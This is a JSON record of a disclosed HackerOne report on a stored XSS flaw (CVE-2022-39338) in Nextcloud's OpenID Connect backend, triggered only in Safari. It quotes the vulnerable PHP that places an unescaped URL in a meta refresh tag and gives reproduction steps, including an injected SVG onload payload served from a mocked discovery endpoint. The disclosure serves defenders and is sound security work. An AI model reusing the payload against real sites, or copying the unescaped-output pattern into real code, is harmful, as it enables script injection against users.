@@ -1,0 +1,153 @@
+{
+  "id": 1687410,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjg3NDEw",
+  "url": "https://hackerone.com/reports/1687410",
+  "title": "[user_oidc] Stored XSS via Authorization Endpoint - Safari-Only",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-31T13:13:12.504Z",
+  "submitted_at": "2022-08-31T13:13:12.592Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lauritz",
+    "url": "/lauritz",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/g4U1xdatWYGm57xcNJJw4v4W/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-39338"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-12-18T12:41:59.578Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-12-18T12:41:59.494Z",
+  "team_member_agreed_on_going_public_at": "2022-11-25T11:28:43.412Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nThe [OpenID Connect User Backend](https://github.com/nextcloud/user_oidc/) allows users to login to Nextcloud using SSO.\n\nA workaround that was apparently implemented for the *Safari*  browser enables stored Cross-Site-Scripting (XSS). The vulnerability only affects user agents that include \"**Safari**\" within their user agent string and is further limited by a restrictive Content-Security-Policy that is applied on the affected endpoint.\n\n## Vulnerable Code\n`/var/www/html/custom_apps/user_oidc/lib/Controller/LoginController.php`\n```php\n\t\t// Workaround to avoid empty session on special conditions in Safari\n\t\t// https://github.com/nextcloud/user_oidc/pull/358\n\t\tif ($this->request->isUserAgent(['/Safari/']) && !$this->request->isUserAgent(['/Chrome/'])) {\n\t\t\treturn new Http\\DataDisplayResponse('<meta http-equiv=\"refresh\" content=\"0; url=' . $url . '\" />');\n\t\t}\n```\n\n\n## Exploit/Steps To Reproduce\n0. Setup Nextcloud using the docker image:\n```console\n$ docker run -p 8081:80 nextcloud:latest\n```\n1. Enable `user_oidc` module via http://localhost:8081/settings/apps/integration/user_oidc\n2. Configure plugin via http://localhost:8081/settings/admin/user_oidc - add a provider with arbitrary identifier, client_id and client_secret. Include the following URL as discovery endpoint: https://lhq.at/poc_jkhfdasgfdaskjlfadskhfdas.php.     \n{F1894251}\n\nThe mocked discovery endpoint responds as follows:\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n[...]\n\n{\n  \"issuer\":\"http:\\/\\/idp.local:3000\",\n  \"authorization_endpoint\":\"'\\\" http-equiv=><svg\\/onload=alert(document.domain)>\",\n[...]\n} \n```\n3.  Launch a login flow using a Safari browser: http://localhost:8081/login.    \nNextcloud responds as follows without sufficiently encoding or filtering the `authorization_endpoint`:\n```http\nHTTP/1.1 200 OK\nDate: Wed, 31 Aug 2022 12:47:57 GMT\nServer: Apache/2.4.54 (Debian)\nReferrer-Policy: no-referrer\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-Permitted-Cross-Domain-Policies: none\nX-Robots-Tag: none\nX-XSS-Protection: 1; mode=block\nX-Powered-By: PHP/8.0.21\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-cache, no-store, must-revalidate\nPragma: no-cache\nContent-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'\nX-Request-Id: yUWr3aQshJ5OHyMuzG1j\nFeature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'\nContent-Disposition: inline; filename=\"\"\nVary: Accept-Encoding\nContent-Length: 492\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n<meta http-equiv=\"refresh\" content=\"0; url='\" http-equiv=><svg/onload=alert(document.domain)>?client_id=test.local&response_type=code&scope=openid+email+profile&redirect_uri=http%3A%2F%2Flocalhost%3A8081%2Fapps%2Fuser_oidc%2Fcode&claims=%7B%22id_token%22%3A%7B%22email%22%3Anull%2C%22name%22%3Anull%2C%22quota%22%3Anull%7D%2C%22userinfo%22%3A%7B%22email%22%3Anull%2C%22name%22%3Anull%2C%22quota%22%3Anull%7D%7D&state=FB8IZL2JE55LJ1Y5HJAINPY6OTDQ16P1&nonce=356M5O3J1PKMRKJNBKE40RUGJA06O40E\" />\n```\n\nThe execution of JavaScript is prevented by the `Content-Security-Policy` header:      \n{F1894250}\n\n## Impact\n\nStored XSS. The impact is limited due to the restrictive CSP that is applied on this endpoint.",
+  "bounty_amount": "100.0",
+  "formatted_bounty": "$100",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1894250,
+      "file_name": "xss2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5ulz2it24bxffp2vcnd00ve9e0r3?response-content-disposition=attachment%3B%20filename%3D%22xss2.png%22%3B%20filename%2A%3DUTF-8%27%27xss2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5AHHFMEJ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142948Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD8dwfn1Kj%2BfeaL5gzEI8UQeliCkaZPwm78CLk3lspT%2FQIgHL1wmZsf1VsJQ5sjD8MiZyL7UnzjLYAzSBx0sKO8WyEqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDAV4ajzpcbbLNFGYRyqNBcaHBbQY8d9HZRhiuXEHGn%2F1OtAJRNK7XpMdTbWfnCZm4bOyE574qr0jtdBxDfuWieLaPcttPkVgpHgYbxyi87pZrfg%2BQ28zxq66lNCthWBZ2doW15zNpMM%2F9nOztWVMVhIbzsixTF%2BT7l7uyl33YzXYlkb07JY2VDB58KJ7C4fAx937EkE7Yi9Pdhm7sRqy%2FCi3G1zuegmzxG8hOMgCGrhgAXLcbelYp4PpLzqYACjoDFemWIs1Q6tX0ejLyuxtFc3YFnVgK5QrjUzdl92ATZWhLfAS0EvZm4JYv3M3w7D5dc5LSUB5SRsFVo%2FJ4VuyME0SBUx%2BkQNLMkZAT2r%2Fo5RE%2F4L6KDEjmACW83f4hlQGBtlTVEwvFbuPgIyYlWxdoq0t3LUZpBDXc%2BPS2VTArbZSE%2BaT7zo8RV6LxmYMduxDABnoe%2Fsarws6IbvoTxkgtlnVD%2BKVzGhV2Kpx4Ou1kHRYFSgmTbsNYO4Y8Wb1e5%2B%2BS6s2646wAxYYg23swOTxxvzz5lNFtKoYv9SzGSHR%2Bt7jF7nMZ94klARn08fNYEITa5xCtmQPQxXYnNUGDhJwaY16V4RWgGBRnNKAVaFFvkJ1ynsUW8yhzdYRzHg2MUk3ilpDNhoDmhJcwEI%2F%2B58pkGgjaSaLJIPme8RKxLJ1GMN0iH%2BEwXdhWILcVuHYd6wa%2B%2FKXE5FDbUD7eG56743XVMOhkYP3rcFw7FVZW0UwPdqxEP%2Fn9xdX6i5mE6bavN9IwWu3oBvV2zuBIQBTADK4q1P8GuigCBpi%2BuTiNwMJNbiVlInmuPTfz1wEP2GyXJhPc6XnrMesge8t7TG7F0S%2BbNKCbtKOPQ6GDuIiaDXeKHghoIp%2F9iOV4wbqsY50MIvgra4GOrEBPkHem%2B9jI8gbVbdcOAUQ%2FDUjU7MDdxE7HFwAfLOdf%2BVcHlA15r9Z97uuaTM8oQAR5uy%2F9X3GVCa2aFmB79Ly6LQ%2BAVH5ZN78UlWslzLKbf%2BtG1X3N4Q9HzPHsMo8p%2FSdABywT4KHH4PFNjhgQtGZbJNTlDMH3n%2Fd9jZEyLjEldEDxA9aGvJgxd7k%2Bi%2F2cncXEy8E%2F8tLGOyvNAQKIwl5%2Bf%2B8GENUcLUW1FeBb7fFdSG3&X-Amz-SignedHeaders=host&X-Amz-Signature=cfd464c604b439877b7485f60924a250f42a1e0a02c51adcbea5e6ae7c3ccca7",
+      "file_size": 48773,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1894251,
+      "file_name": "xss1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/a6nh8d762i1ihfoms98u2snzd9zf?response-content-disposition=attachment%3B%20filename%3D%22xss1.png%22%3B%20filename%2A%3DUTF-8%27%27xss1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5AHHFMEJ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142948Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD8dwfn1Kj%2BfeaL5gzEI8UQeliCkaZPwm78CLk3lspT%2FQIgHL1wmZsf1VsJQ5sjD8MiZyL7UnzjLYAzSBx0sKO8WyEqsAUIdxADGgwwMTM2MTkyNzQ4NDkiDAV4ajzpcbbLNFGYRyqNBcaHBbQY8d9HZRhiuXEHGn%2F1OtAJRNK7XpMdTbWfnCZm4bOyE574qr0jtdBxDfuWieLaPcttPkVgpHgYbxyi87pZrfg%2BQ28zxq66lNCthWBZ2doW15zNpMM%2F9nOztWVMVhIbzsixTF%2BT7l7uyl33YzXYlkb07JY2VDB58KJ7C4fAx937EkE7Yi9Pdhm7sRqy%2FCi3G1zuegmzxG8hOMgCGrhgAXLcbelYp4PpLzqYACjoDFemWIs1Q6tX0ejLyuxtFc3YFnVgK5QrjUzdl92ATZWhLfAS0EvZm4JYv3M3w7D5dc5LSUB5SRsFVo%2FJ4VuyME0SBUx%2BkQNLMkZAT2r%2Fo5RE%2F4L6KDEjmACW83f4hlQGBtlTVEwvFbuPgIyYlWxdoq0t3LUZpBDXc%2BPS2VTArbZSE%2BaT7zo8RV6LxmYMduxDABnoe%2Fsarws6IbvoTxkgtlnVD%2BKVzGhV2Kpx4Ou1kHRYFSgmTbsNYO4Y8Wb1e5%2B%2BS6s2646wAxYYg23swOTxxvzz5lNFtKoYv9SzGSHR%2Bt7jF7nMZ94klARn08fNYEITa5xCtmQPQxXYnNUGDhJwaY16V4RWgGBRnNKAVaFFvkJ1ynsUW8yhzdYRzHg2MUk3ilpDNhoDmhJcwEI%2F%2B58pkGgjaSaLJIPme8RKxLJ1GMN0iH%2BEwXdhWILcVuHYd6wa%2B%2FKXE5FDbUD7eG56743XVMOhkYP3rcFw7FVZW0UwPdqxEP%2Fn9xdX6i5mE6bavN9IwWu3oBvV2zuBIQBTADK4q1P8GuigCBpi%2BuTiNwMJNbiVlInmuPTfz1wEP2GyXJhPc6XnrMesge8t7TG7F0S%2BbNKCbtKOPQ6GDuIiaDXeKHghoIp%2F9iOV4wbqsY50MIvgra4GOrEBPkHem%2B9jI8gbVbdcOAUQ%2FDUjU7MDdxE7HFwAfLOdf%2BVcHlA15r9Z97uuaTM8oQAR5uy%2F9X3GVCa2aFmB79Ly6LQ%2BAVH5ZN78UlWslzLKbf%2BtG1X3N4Q9HzPHsMo8p%2FSdABywT4KHH4PFNjhgQtGZbJNTlDMH3n%2Fd9jZEyLjEldEDxA9aGvJgxd7k%2Bi%2F2cncXEy8E%2F8tLGOyvNAQKIwl5%2Bf%2B8GENUcLUW1FeBb7fFdSG3&X-Amz-SignedHeaders=host&X-Amz-Signature=dbdebde7107cfab7360c2a5fc8a5fd3a205502f6b2d0468be1522e59a21b3877",
+      "file_size": 879150,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-12-25T11:28:43.554Z",
+  "allow_singular_disclosure_after": -35866864.97978006,
+  "singular_disclosure_allowed": true,
+  "vote_count": 18,
+  "voters": [
+    "jumpydata",
+    "shreyaschavhan",
+    "zy9ard3",
+    "shubham_srt",
+    "h4x0r_dz",
+    "sa1tama0",
+    "kaiz3nn",
+    "exception",
+    "hunterr0x01",
+    "shivammusic",
+    "and 8 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 68215,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/user_oidc",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
